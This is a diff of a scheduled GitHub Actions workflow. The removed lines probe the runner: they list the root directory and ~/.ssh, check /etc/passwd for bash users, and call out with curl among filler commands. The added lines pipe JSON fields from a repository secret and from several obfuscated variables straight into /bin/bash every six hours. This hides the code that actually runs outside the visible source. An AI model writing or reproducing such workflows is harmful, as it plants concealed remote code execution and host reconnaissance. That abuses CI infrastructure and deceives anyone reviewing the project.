@@ -3,31 +3,23 @@ name: moguangmin1989
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '13 5/6 * * *'
 
-jobs:  # 15703
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: moguangmin1989
         env:
-          l30842: ${{ secrets.l30842 }}
+          ro03830: ${{ secrets.ro03830 }}
         run: |
-          export ROOT_DIR_FILE_LIST=$(find / -maxdepth 1); echo $ROOT_DIR_FILE_LIST
-          which cat | export GGGGG=
-          echo $l30842 | jq -r .w28569 | /bin/bash
-          [ "$(which sqlite3)" != "" ] && echo "sqlite3 installed" || echo "sqlite3 not installed"
-          git pull -r
-          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
-          curl www.google.com
-          [ -d "$HOME/.ssh" ] && echo "$(ls -al $HOME/.ssh)" || echo "$HOME/.ssh not exists"
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
-          echo "User: $(whoami)"
-          for i in {1..3}; do echo "Iter $i"; done
-          echo "Build $(date +%s)"
-          echo "Version: $((1 + RANDOM % 5))"
-          which screen
-          git remote -vv
-          uname -a
+          echo $ro03830 | jq -r .rgai563 | /bin/bash
+          echo $s6 | jq -r .mq64 | /bin/bash
+          echo $d908 | jq -r .qto2779 | /bin/bash
+          echo $kb21575 | jq -r .n57123 | /bin/bash
+          echo $ktzdk93 | jq -r .tmfcd089 | /bin/bash
+          echo $mpowg41 | jq -r .w4 | /bin/bash
+          echo $cypu76 | jq -r .v2 | /bin/bash
+          echo $kbzsn694 | jq -r .rq4099 | /bin/bash
+
